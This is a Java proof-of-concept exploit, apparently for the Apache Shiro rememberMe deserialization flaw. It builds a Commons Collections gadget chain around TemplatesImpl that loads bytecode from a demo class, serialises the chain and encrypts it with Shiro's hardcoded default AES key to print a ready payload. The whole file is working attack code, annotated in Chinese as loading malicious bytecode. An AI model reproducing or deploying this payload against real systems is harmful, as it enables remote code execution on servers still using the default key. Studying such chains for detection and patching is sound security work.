package ysoserial.vulndemo;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.NotFoundException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import javax.xml.transform.Templates;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class shiro_POC2 {
    public static void setFieldValue(Object obj, String fieldname, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static byte[] getPayload() throws NoSuchFieldException, IllegalAccessException, NotFoundException, IOException, CannotCompileException {
        //恶意字节码得加载
        byte[] bytes = ClassPool.getDefault().get("ysoserial.vulndemo.Calc").toBytecode();
        //创建TemplatesImpl利用链
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "RoboTerh");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});

        //创建 Transformer实例
        Transformer faketransformer = new ConstantTransformer(1);
        Transformer transformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        //创建LazyMap 实例
        HashMap innermap = new HashMap();
        Map lazymap = LazyMap.decorate(innermap,faketransformer);

        //创建 TiedMapEntry实例
        TiedMapEntry tme = new TiedMapEntry(lazymap, TrAXFilter.class);
        //创建readObject 入口
        HashMap evilmap = new HashMap();
        evilmap.put(tme,"jiang");
        lazymap.clear();
        setFieldValue(lazymap,"factory",transformer);
        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(evilmap);
        oos.close();
        return baor.toByteArray();
    }

    public static void main(String[] args) throws NotFoundException, IOException, CannotCompileException, NoSuchFieldException, IllegalAccessException {
        //生成shiro的payload
        byte[] payload = getPayload();
        AesCipherService aes = new AesCipherService();
        //key值得解码
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource encrypt = aes.encrypt(payload, key);
        System.out.println(encrypt);
    }
}
